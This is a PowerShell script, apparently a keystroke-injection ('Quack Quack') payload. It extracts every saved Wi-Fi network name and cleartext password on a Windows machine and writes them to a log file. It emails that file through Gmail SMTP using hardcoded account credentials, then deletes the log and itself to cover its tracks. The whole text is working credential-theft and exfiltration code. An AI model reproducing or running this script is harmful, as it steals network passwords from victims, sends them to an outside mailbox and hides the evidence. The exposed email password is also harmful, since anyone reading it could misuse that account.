(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:C:\Users\Public\log.txt;
$SMTPServer = 'smtp.gmail.com';
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);
$SMTPInfo.EnableSsl = $true;
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('lol23012002@gmail.com', 'djokbrihjfcyjcsy');
$ReportEmail = New-Object System.Net.Mail.MailMessage;
$ReportEmail.From = 'lol23012002@gmail.com';
$ReportEmail.To.Add('lol23012002@gmail.com');
$ReportEmail.Subject = 'USER CREDENTIALS';
$ReportEmail.Body = 'Here are the usernames I found for you. Quack Quack.';
$ReportEmail.Attachments.Add('C:\Users\Public\log.txt');
$SMTPInfo.Send($ReportEmail);
$ReportEmail.Dispose();
Remove-Item 'C:\Users\Public\log.txt', 'C:\Users\Public\script.ps1';